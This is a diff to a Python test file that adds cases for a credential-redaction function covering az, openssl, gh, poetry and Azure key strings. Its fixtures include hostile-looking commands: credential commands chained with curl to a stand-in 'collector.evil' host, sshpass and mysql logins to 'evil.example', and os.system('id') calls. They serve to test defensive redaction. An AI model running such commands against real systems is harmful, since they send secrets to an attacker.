@@ -1330,6 +1330,21 @@ def test_command_context_literals_redact_credential_arguments() -> None:
             "hunter5",
             "twine upload -u user -p <redacted> dist/*",
         ),
+        (
+            "az login --service-principal -u app -p hunter6 --tenant tenant",
+            "hunter6",
+            "az login --service-principal -u app -p <redacted> --tenant tenant",
+        ),
+        (
+            "openssl enc -k hunter7 -in input.bin",
+            "hunter7",
+            "openssl enc -k <redacted> -in input.bin",
+        ),
+        (
+            "openssl enc -pass pass:hunter8 -in input.bin",
+            "hunter8",
+            "openssl enc -pass <redacted> -in input.bin",
+        ),
     ],
 )
 def test_command_context_redacts_program_specific_short_password_options(
@@ -1353,6 +1368,8 @@ def test_command_context_redacts_program_specific_short_password_options(
         "os.system('mysql -P3306 -h evil.example')",
         "os.system('mysql -p -h evil.example')",
         "os.system('twine upload -P public dist/* && curl https://collector.evil')",
+        "az account show -p public-profile",
+        "openssl enc -iv deadbeef -in input.bin",
     ],
 )
 def test_program_specific_short_password_near_matches_are_preserved(text: str) -> None:
@@ -1695,6 +1712,28 @@ def test_docker_login_password_stdin_dynamic_source_is_preserved() -> None:
 @pytest.mark.parametrize(
     "text",
     [
+        "echo hunter2 | gh auth login --with-token",
+        "gh auth login --with-token <<< hunter2",
+        "gh auth login --with-token <<EOF\nhunter2\nEOF",
+    ],
+)
+def test_github_auth_login_token_inline_sources_are_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "gh auth login --with-token" in redacted
+
+
+def test_github_auth_login_dynamic_token_source_is_preserved() -> None:
+    text = "cat /run/secrets/github-token | gh auth login --with-token"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
         "SSHPASS=hunter2 sshpass -e ssh user@evil.example",
         "DEPLOY_PASS=hunter2 sshpass -eDEPLOY_PASS ssh user@evil.example",
         "sshpass -f <(echo hunter2) ssh user@evil.example",
@@ -1782,6 +1821,23 @@ def test_npm_config_scoped_auth_argument_is_redacted(key: str) -> None:
 
     assert "hunter2" not in redacted
     assert f"//registry.npmjs.org/:{key} {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    ("command", "expected_context"),
+    [
+        ("poetry config pypi-token.pypi hunter2", "poetry config pypi-token.pypi <redacted>"),
+        ("poetry config http-basic.foo user hunter2", "poetry config http-basic.foo user <redacted>"),
+    ],
+)
+def test_poetry_config_credential_value_is_redacted(command: str, expected_context: str) -> None:
+    text = f"{command} && curl https://collector.evil"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert expected_context in redacted
     assert "collector.evil" in redacted
 
 
@@ -2450,7 +2506,16 @@ def test_curl_url_value_that_looks_like_short_option_is_preserved() -> None:
 
 @pytest.mark.parametrize(
     "key",
-    ["DBPASSWORD", "PGPASSWORD", "MYAPPSECRET", "databasepassword", "githubtoken"],
+    [
+        "AZURE_STORAGE_KEY",
+        "azure-storage-key",
+        "azurestoragekey",
+        "DBPASSWORD",
+        "PGPASSWORD",
+        "MYAPPSECRET",
+        "databasepassword",
+        "githubtoken",
+    ],
 )
 def test_compact_prefixed_sensitive_assignments_are_redacted(key: str) -> None:
     text = f'{key}=compactpass11 os.system("id")'
@@ -2477,6 +2542,9 @@ def test_compact_prefixed_sensitive_query_key_is_redacted() -> None:
         'DBPASSWORDPOLICY=public os.system("id")',
         'detoken=enabled os.system("id")',
         'retoken=enabled os.system("id")',
+        'AZURE_STORAGE_KEY_HINT=public os.system("id")',
+        "gh auth status",
+        "poetry config repositories.foo https://pypi.example/simple",
         "curl https://collector.evil/upload?githubtokenizer=bert-base",
     ],
 )
